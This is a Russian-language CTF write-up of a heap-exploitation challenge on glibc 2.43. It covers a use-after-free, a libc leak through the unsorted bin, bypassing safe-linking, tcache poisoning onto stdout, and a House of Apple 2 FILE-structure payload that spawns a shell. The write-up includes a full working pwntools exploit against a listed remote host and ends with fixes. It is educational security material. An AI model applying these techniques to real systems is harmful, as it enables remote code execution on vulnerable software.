# «Я в своём познании настолько преисполнился» — Codeby CTF WriteUp

**Платформа:** HACKERLAB / Codeby CTF  
**Категория:** PWN  
**Сложность:** Сложный  
**Цель:** `62.173.140.174:29010`  
**Формат флага:** `CODEBY{...}`

> Самая новая libc и какие-то защиты... Сможете ли вы преисполниться и получить шелл, слившись с бесконечно вечным?

---

## Содержание

1. [Знакомство с заданием](#1-знакомство-с-заданием)
2. [Статический анализ](#2-статический-анализ)
3. [Логика программы](#3-логика-программы)
4. [Use-After-Free](#4-use-after-free)
5. [Утечка libc через unsorted bin](#5-утечка-libc-через-unsorted-bin)
6. [Safe-linking и утечка ключа tcache](#6-safe-linking-и-утечка-ключа-tcache)
7. [Tcache poisoning до stdout](#7-tcache-poisoning-до-stdout)
8. [House of Apple 2 на glibc 2.43](#8-house-of-apple-2-на-glibc-243)
9. [Полный эксплойт](#9-полный-эксплойт)
10. [Получение флага](#10-получение-флага)
11. [Полная цепочка атаки](#11-полная-цепочка-атаки)
12. [Выводы](#12-выводы)

---

## 1. Знакомство с заданием

В архиве задания находятся:

```text
chall
libc.so.6
ld-linux-x86-64.so.2
Dockerfile
build_docker.sh
flag.txt
```

`flag.txt` локально содержит заглушку, поэтому настоящий флаг нужно читать уже из удалённого процесса.

Dockerfile подтверждает запуск через `socat`:

```dockerfile
WORKDIR /home/ctf
COPY chall flag.txt ./
USER ctf
CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:/home/ctf/chall,stderr"]
```

Процесс запускается от непривилегированного пользователя, а `flag.txt` доступен ему на чтение. После получения shell достаточно выполнить `cat flag.txt`.

---

## 2. Статический анализ

### Проверка защит

```bash
checksec --file=chall
```

| Защита | Состояние |
|---|---|
| RELRO | Full |
| Stack Canary | найден |
| NX | включён |
| PIE | включён |
| SHSTK | включён |
| IBT | включён |
| Symbols | бинарник не stripped |

Подключённая библиотека — glibc 2.43:

```text
GNU C Library (Ubuntu GLIBC 2.43-2ubuntu2) stable release version 2.43
```

Full RELRO закрывает обычную перезапись GOT, а классические `__malloc_hook`/`__free_hook` больше не дают рабочий путь к `system`. Поэтому понадобится heap-эксплуатация с переходом к FILE-структуре.

### Интересующие символы

Бинарник не stripped, поэтому имена функций доступны напрямую:

```text
plant_apple   0x155b
pick_apple    0x1703
view_apple    0x1800
update_apple  0x18ec
main          0x1a1e
```

Глобальные объекты имеют следующие PIE-relative адреса:

```text
host_name    0x4060
apples       0x4080       // 10 указателей
sizes        0x40e0       // 10 размеров
is_freed     0x4140       // 10 флагов
update_count 0x4168
```

---

## 3. Логика программы

После приветствия программа показывает меню:

```text
[1] Plant an apple
[2] Pick an apple
[3] Inspect an apple
[4] Fertilize an apple
[5] Leave the orchard
```

### `plant_apple()`

Функция ищет первый свободный слот, принимает размер от `1` до `0x500`, выделяет память и читает описание:

```c
for (i = 0; i <= 9; i++) {
    if (apples[i] == NULL) {
        slot = i;
        break;
    }
}

size = read_int();
if (size <= 0 || size > 0x500)
    return;

ptr = malloc(size);
if (!ptr)
    return;

read(0, ptr, size);
apples[slot] = ptr;
sizes[slot] = size;
is_freed[slot] = 0;
```

### `pick_apple()`

Освобождение выглядит так:

```c
if (is_freed[index])
    return;

free(apples[index]);
is_freed[index] = 1;
```

После `free()` указатель `apples[index]` не обнуляется.

### `view_apple()` и `update_apple()`

Просмотр проверяет только то, что указатель не равен `NULL`, но не проверяет `is_freed`:

```c
write(1, apples[index], sizes[index]);
```

Обновление имеет ту же проблему:

```c
if (update_count > 1)
    return;

read(0, apples[index], sizes[index]);
update_count++;
```

Таким образом, доступно две UAF-записи, хотя для решения достаточно одной — записи отравленного `fd` в tcache.

---

## 4. Use-After-Free

Уязвимость состоит из трёх частей:

1. `pick_apple()` вызывает `free()`, но оставляет dangling pointer в `apples[]`.
2. `view_apple()` читает данные через этот dangling pointer.
3. `update_apple()` пишет через тот же pointer и не смотрит на `is_freed`.

Итоговые примитивы:

```text
pick       -> free(chunk), pointer остаётся в apples[]
view       -> UAF read
fertilize  -> UAF write
```

Из-за этого можно читать метаданные allocator'а и менять содержимое уже освобождённого чанка, в том числе его `tcache_entry.next`.

---

## 5. Утечка libc через unsorted bin

Сначала выделяем два чанка размером `0x500`:

```text
slot 0: malloc(0x500)
slot 1: malloc(0x500)
```

Второй чанк нужен, чтобы первый не слился с top chunk при освобождении.

Запрос `0x500` превращается в chunk size `0x510`, что больше максимального размера tcache. После `free(slot0)` чанк попадает в unsorted bin. В начале пользовательской области появляются указатели `fd` и `bk` на структуру `main_arena` внутри libc.

Далее `view_apple(0)` печатает освобождённую память. Перед байтами чанка программа выводит строку:

```text
Apple description [0]: 
```

Её длина равна 23 байтам, поэтому leak извлекается так:

```python
leak_out = view(r, 0)
libc_leak = u64(leak_out[23:31])
```

Для выданной `libc.so.6` адрес `fd` имеет смещение `0x212ac8` от базы libc:

```python
libc.address = libc_leak - 0x212ac8
```

Пример реального запуска:

```text
unsorted leak: 0x7f580ee98ac8
libc base:     0x7f580ec86000
```

Смещение стабильно, потому что и leak, и база сдвигаются одним и тем же ASLR-адресом.

---

## 6. Safe-linking и утечка ключа tcache

Следующий этап — получить одну запись в tcache bin для запроса `0x400`.

Выделяем:

```text
slot 2: malloc(0x400)
slot 3: malloc(0x100)   // guard chunk
```

Guard нужен, чтобы освобождаемый chunk не оказался последним чанком перед top chunk.

Современный glibc использует safe-linking:

```c
PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr;
```

Для единственного элемента `ptr == NULL`, поэтому первые 8 байт освобождённого чанка равны `pos >> 12`. Эти байты читаются через UAF:

```python
pick(r, 2)
tcache_out = view(r, 2)
tcache_key = u64(tcache_out[23:31])
```

Пример:

```text
safe-linking key: 0x55e688904
```

---

## 7. Tcache poisoning до stdout

Из libc нам известны необходимые адреса:

```python
stdout = libc.sym['_IO_2_1_stdout_']  # libc + 0x213580
system = libc.sym['system']            # libc + 0x5c560
wfile  = libc.sym['_IO_wfile_jumps']   # libc + 0x211228
```

Через UAF-запись меняем `next` освобождённого tcache-элемента:

```python
poison = p64(stdout ^ tcache_key)
fertilize(r, 2, poison)
```

После этого:

```text
plant(0x400) -> возвращает настоящий chunk slot 2
plant(0x400) -> возвращает адрес _IO_2_1_stdout_
```

Аллокатор отдаёт второй адрес как результат `malloc()`. Затем `plant_apple()` выполняет обычный `read(0, ptr, 0x400)`, и мы получаем запись 0x400 байт прямо поверх глобального объекта `stdout` в libc.

Адрес `_IO_2_1_stdout_` выровнен на 16 байт и проходит проверку tcache. Проверки настоящего размера heap-chunk для возвращаемого элемента здесь нет.

---

## 8. House of Apple 2 на glibc 2.43

Простая подмена `stdout->vtable` на адрес из heap больше не работает: glibc проверяет, что vtable находится внутри допустимого диапазона libc IO-vtables.

Используем настоящий vtable:

```c
stdout->_vtable = libc.sym['_IO_wfile_jumps']
```

`_IO_wfile_jumps` проходит проверку. При этом wide-часть FILE-структуры приводит к вызову функции из поля `_wide_vtable`, которое мы размещаем в подконтрольной области.

### Раскладка payload

Все смещения ниже указаны относительно `_IO_2_1_stdout_`:

| Смещение | Значение | Назначение |
|---:|---|---|
| `0x00` | `b' sh\0'` | строка, которую получит `system()` |
| `0x20` | `0` | `_IO_write_base` |
| `0x28` | `1` | `_IO_write_ptr`, активирует вывод |
| `0x30` | `0` | `_IO_write_end` |
| `0x88` | `stdout + 0x3f8` | writable lock |
| `0xa0` | `stdout + 0x100` | fake `_IO_wide_data` |
| `0xc0` | `0` | `_mode` |
| `0xd8` | `_IO_wfile_jumps` | легитимный narrow vtable |
| `0x118` | `0` | wide `_IO_write_base` |
| `0x120` | `stdout + 0x300` | wide `_IO_write_ptr` |
| `0x128` | `stdout + 0x3f0` | wide `_IO_write_end` |
| `0x130` | `0` | wide `_IO_buf_base` |
| `0x1e0` | `stdout + 0x250` | fake `_wide_vtable` |
| `0x2b8` | `system` | fake table entry `+0x68` |

Координаты fake-объектов:

```text
stdout + 0x100 + 0xe0 = stdout + 0x1e0  -> _wide_vtable
stdout + 0x250 + 0x68 = stdout + 0x2b8  -> system
```

Lock выбран как `stdout + 0x3f8`: эта область остаётся нулевой и не пересекается с fake wide output buffer. Если поместить lock внутрь буфера вывода, последующая запись текста испортит mutex и процесс зависнет на futex.

Ключевой путь внутри glibc выглядит концептуально так:

```c
if (fp->_wide_data->_IO_buf_base == NULL) {
    fp->_wide_data->_wide_vtable->__doallocate(fp);
}
```

При смещении `+0x68` нашей fake wide table находится `system`. Аргументом является сам `FILE *fp`, то есть адрес `stdout`. Первые байты stdout содержат строку `" sh"`, поэтому фактически запускается `sh`.

После записи fake FILE программа продолжает печатать сообщение об успешной посадке яблока и меню. Fake wide buffer рассчитан на эти записи, а при его исчерпании управление доходит до `system(stdout)`.

---

## 9. Полный эксплойт

```python
from pathlib import Path
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

LOCAL = len(sys.argv) > 1 and sys.argv[1] == "local"
HOST, PORT = "62.173.140.174", 29010
libc = ELF(str(Path(__file__).with_name("libc.so.6")), checksec=False)


def start():
    if LOCAL:
        return process([
            "./ld-linux-x86-64.so.2",
            "--library-path", ".",
            "./chall",
        ])
    return remote(HOST, PORT)


def plant(io, size, data=b"X", exact=False, wait=True):
    io.sendline(b"1")
    io.recvuntil(b"Apple size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Apple variety/description: ")

    if exact:
        assert len(data) == size
        io.send(data)
    else:
        io.send(data + b"\n")

    if wait:
        io.recvuntil(b"> ")


def pick(io, index):
    io.sendline(b"2")
    io.recvuntil(b"Apple index: ")
    io.sendline(str(index).encode())
    return io.recvuntil(b"> ")


def view(io, index):
    io.sendline(b"3")
    io.recvuntil(b"Apple index: ")
    io.sendline(str(index).encode())
    return io.recvuntil(b"> ")


def fertilize(io, index, data):
    io.sendline(b"4")
    io.recvuntil(b"Apple index: ")
    io.sendline(str(index).encode())
    io.recvuntil(b"New apple description: ")
    io.send(data)
    io.recvuntil(b"> ")


io = start()
io.recvuntil(b"What is the name")
io.recvuntil(b"> ")
io.sendline(b"filled")
io.recvuntil(b"> ")

# 1. Unsorted-bin leak.
plant(io, 0x500, b"A")
plant(io, 0x500, b"B")
pick(io, 0)

leak_out = view(io, 0)
libc_leak = u64(leak_out[23:31])
libc.address = libc_leak - 0x212AC8
log.info("libc leak: %#x", libc_leak)
log.info("libc base: %#x", libc.address)

# 2. Leak the safe-linking value from a single tcache entry.
plant(io, 0x400, b"T")
plant(io, 0x100, b"G")
pick(io, 2)

tcache_out = view(io, 2)
tcache_key = u64(tcache_out[23:31])
log.info("safe-linking key: %#x", tcache_key)

# 3. Poison tcache to _IO_2_1_stdout_.
stdout = libc.sym["_IO_2_1_stdout_"]
system = libc.sym["system"]
wfile = libc.sym["_IO_wfile_jumps"]

fertilize(io, 2, p64(stdout ^ tcache_key))
plant(io, 0x400, b"R")

# 4. Fake FILE / wide-data / wide-vtable.
payload = bytearray(0x400)
put = lambda off, value: payload.__setitem__(slice(off, off + 8), p64(value))

payload[0:8] = b" sh\x00\x00\x00\x00\x00"
put(0x20, 0)
put(0x28, 1)
put(0x30, 0)
put(0x88, stdout + 0x3F8)
put(0xA0, stdout + 0x100)
put(0xC0, 0)
put(0xD8, wfile)
put(0x118, 0)
put(0x120, stdout + 0x300)
put(0x128, stdout + 0x3F0)
put(0x130, 0)
put(0x1E0, stdout + 0x250)
put(0x2B8, system)

# The malloc() result is stdout, so the next read overwrites it.
plant(io, 0x400, bytes(payload), exact=True, wait=False)

# The leading `5` can be consumed by the spawned shell instead of the menu.
io.send(b"5\ncat flag.txt; exit\n")
print(io.recvrepeat(4).decode("latin1", errors="replace"))
```

Запуск из каталога с файлами задания:

```bash
python3 apple_exploit.py
```

Для локальной проверки:

```bash
python3 apple_exploit.py local
```

---

## 10. Получение флага

Результат запуска на удалённом сервисе:

```text
[*] unsorted leak: 0x7f580ee98ac8
[*] libc base: 0x7f580ec86000
[*] safe-linking key: 0x55e688904
sh: 1: 5: not found
CODEBY{y0u_pwn_th2_newEst_gl1bc}
```

Сообщение `sh: 1: 5: not found` появляется потому, что overflow происходит во время печати меню: байт `5`, который изначально предназначался для меню программы, уже читает созданный shell. На получение флага это не влияет.

Флаг:

```text
CODEBY{y0u_pwn_th2_newEst_gl1bc}
```

---

## 11. Полная цепочка атаки

```text
plant(0x500) slot 0
  |
plant(0x500) slot 1
  |
pick(0)
  |  free -> unsorted bin, dangling pointer остаётся
  v
view(0)
  |  fd/bk -> main_arena -> libc leak
  v
plant(0x400) slot 2
plant(0x100) slot 3
pick(2)
  |  единственный tcache entry -> safe-linking value
  v
view(2)
  |
fertilize(2, stdout ^ (pos >> 12))
  |  UAF-запись отравленного next
  v
plant(0x400) slot 4 -> настоящий chunk slot 2
plant(0x400) slot 5 -> _IO_2_1_stdout_
  |  read(0, stdout, 0x400)
  v
fake FILE + _IO_wfile_jumps
  |
fake wide-data -> fake wide-vtable[0x68] = system
  v
system(stdout) -> " sh"
  |
cat flag.txt
```

---

## 12. Выводы

Главная уязвимость — не просто отсутствие `NULL` после `free()`, а сочетание сразу нескольких ошибок:

1. dangling pointer хранится в глобальном массиве;
2. `view_apple()` читает освобождённую память;
3. `update_apple()` пишет в освобождённую память;
4. проверка `is_freed` используется только в `pick_apple()`;
5. состояние `update_count` не защищает первую UAF-запись.

Для исправления достаточно было бы:

```c
free(apples[index]);
apples[index] = NULL;
sizes[index] = 0;
is_freed[index] = 1;
```

А `view_apple()` и `update_apple()` должны отказывать для освобождённых объектов. Safe-linking усложняет tcache poisoning, но не устраняет сам примитив чтения/записи, поэтому UAF на современной glibc всё ещё может привести к полному захвату управления.
